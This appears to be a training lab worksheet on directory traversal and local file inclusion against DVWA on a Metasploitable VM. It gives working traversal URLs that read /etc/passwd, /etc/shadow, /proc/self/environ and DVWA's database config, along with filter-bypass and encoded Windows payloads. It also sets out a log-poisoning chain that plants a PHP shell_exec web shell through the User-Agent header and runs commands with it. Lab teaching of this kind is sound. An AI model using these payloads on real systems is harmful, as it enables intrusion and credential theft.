# 🔬 Lab Exercise 8: Directory Traversal

> **Challenge:** Read files outside the intended directory using path traversal
> **Where:** DVWA on Metasploitable (File Inclusion module)
> **Time:** ~40-50 minutes

---

## Exercise 8A: Basic Path Traversal on DVWA (Low Security)

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/fi/`

> **Prerequisite:** DVWA security set to **Low**

```
Step 1: Understand the page
  - Go to http://192.168.56.20/dvwa/vulnerabilities/fi/
  - Click on "file1.php" link
  - 📝 Look at the URL:
    http://192.168.56.20/dvwa/vulnerabilities/fi/?page=file1.php
  - 📝 The "page" parameter loads a file — this is our injection point!

Step 2: Try including another file on the system
  - Change the URL to:
    http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/etc/passwd
  ✅ EXPECTED: Contents of /etc/passwd displayed on the page!
  📝 Copy the first few lines: ______________

Step 3: Try path traversal with ../
  - URL: http://192.168.56.20/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd
  ✅ EXPECTED: Same result — /etc/passwd contents shown
  📝 Using ../ goes up directories until reaching the root

Step 4: Read more sensitive files
  # /etc/hosts
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/etc/hosts

  # /etc/shadow (password hashes)
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/etc/shadow
  📝 Could you read /etc/shadow? _____ (Depends on file permissions)

  # Apache config
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/etc/apache2/apache2.conf

  # DVWA config (database credentials!)
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=../../config/config.inc.php
  📝 Did you find database credentials? ______________
```

---

## Exercise 8B: Read System Information via Path Traversal

```
Step 1: Gather system information through file reads

# Kernel version
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/proc/version

# CPU info
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/proc/cpuinfo

# Network interfaces
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/proc/net/arp

# Current process environment variables
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/proc/self/environ

# Currently running as which user?
http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/proc/self/status

📝 Document what you gathered:
  - Kernel: ______________
  - Web server user: ______________
  - Internal IPs: ______________
  - Environment variables: ______________
```

---

## Exercise 8C: Path Traversal at Medium Security — Filter Bypass

**Target:** DVWA File Inclusion at **Medium** security

```
Step 1: Change DVWA security to Medium
  - Go to http://192.168.56.20/dvwa/security.php → set to "Medium"

Step 2: Try the basic traversal
  - URL: .../fi/?page=../../../etc/passwd
  📝 What happened? ______________
  📝 The ../ was likely filtered/removed!

Step 3: View Source to see the filter
  - Click "View Source" on the DVWA page
  📝 What characters/patterns are being filtered?
  📝 Does it filter: ../ ? http:// ? https:// ?

Step 4: Bypass with double traversal
  # If the filter removes ../ once, use nested traversal:
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=....//....//....//etc/passwd
  # When ../ is removed from ....// → what remains is ../
  ✅ EXPECTED: /etc/passwd displayed!

Step 5: Try other bypass techniques
  # Absolute path (no traversal needed)
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/etc/passwd

  # Mixed traversal
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=..././..././..././etc/passwd

  📝 Which bypass techniques worked? ______________
```

---

## Exercise 8D: Path Traversal at High Security

**Target:** DVWA File Inclusion at **High** security

```
Step 1: Change DVWA security to High

Step 2: Try all previous techniques
  - ../../../etc/passwd → 📝 Result: ______________
  - ....//....//etc/passwd → 📝 Result: ______________
  - /etc/passwd → 📝 Result: ______________

Step 3: View Source to understand High security filter
  📝 What validation does High security use?
  📝 Does it check if filename starts with "file"?

Step 4: Bypass using the file:// protocol
  # If the filter requires the page to start with "file"
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=file:///etc/passwd
  📝 Did this work? ______________

Step 5: Try using the file parameter's expected format
  # If the server expects files like "file1.php", try:
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=file1.php/../../../etc/passwd
  📝 Result: ______________

  # Null byte (PHP < 5.3.4)
  http://192.168.56.20/dvwa/vulnerabilities/fi/?page=../../../etc/passwd%00
  📝 Result: ______________
```

---

## Exercise 8E: Log Poisoning via LFI for Remote Code Execution

**Task:** Use LFI + log poisoning to achieve command execution.

> **Prerequisite:** DVWA security set back to **Low**

```bash
# Concept: 
# 1. Apache logs every request (including User-Agent header)
# 2. We inject PHP code into the User-Agent
# 3. The PHP code gets written to the log file
# 4. We use LFI to include the log file → PHP code executes!

# Step 1: Find the Apache log file
# On Metasploitable, logs are typically at:
# /var/log/apache2/access.log

# Verify via LFI:
# URL: http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log
# 📝 Can you see the log file? ______________

# Step 2: Inject PHP code via User-Agent header
curl "http://192.168.56.20/" \
  -H "User-Agent: <?php echo shell_exec(\$_GET['cmd']); ?>"

# Step 3: Include the log file with LFI + execute commands
# URL in Firefox:
# http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=whoami

# Or via curl:
curl "http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=id"

# ✅ EXPECTED: You see "www-data" or "uid=33(www-data)" in the log output!
# 📝 You achieved Remote Code Execution via LFI + log poisoning!

# Step 4: Run more commands
curl "http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=uname%20-a"
curl "http://192.168.56.20/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=cat%20/etc/passwd"
# 📝 What info did you extract?
```

---

## Exercise 8F: Windows Path Traversal (Conceptual + Practice)

**Task:** Understand Windows-specific path traversal (for interview knowledge).

```bash
# Windows uses backslashes and different file paths

# Key Windows files to target:
# C:\windows\win.ini                         → Windows config file
# C:\windows\system32\drivers\etc\hosts      → Host mappings
# C:\windows\system32\config\SAM             → User account database
# C:\inetpub\wwwroot\web.config              → IIS web config
# C:\xampp\htdocs\.env                        → App secrets

# Windows traversal payloads:
# ..\..\..\..\windows\win.ini
# ....\\....\\....\\windows\\win.ini          (double backslash bypass)
# ..%5c..%5c..%5cwindows%5cwin.ini           (URL-encoded backslash)
# ..%255c..%255cwindows%255cwin.ini           (double URL-encoded)

# Practice: URL encoding exercise
python3 -c "
payloads = [
    '../../../etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%afetc/passwd',
    '....//....//....//etc/passwd',
]
for p in payloads:
    print(f'Payload: {p}')
"
# 📝 For each payload, explain what bypass technique it uses:
# 1. Basic traversal: ______________
# 2. URL encoding: ______________
# 3. Double URL encoding: ______________
# 4. Unicode encoding: ______________
# 5. Nested traversal: ______________
```

---

## ✅ Completion Checklist

- [ ] Read /etc/passwd and DVWA config via basic path traversal (8A)
- [ ] Gathered system information through /proc filesystem (8B)
- [ ] Bypassed Medium security filter with nested traversal (8C)
- [ ] Attempted High security bypass with file:// and null byte (8D)
- [ ] Achieved RCE via log poisoning + LFI (8E)
- [ ] Understood Windows path traversal payloads (8F)

---

**Next:** [Challenge 17: Mobile Android Testing →](./09_lab_mobile_android.md)
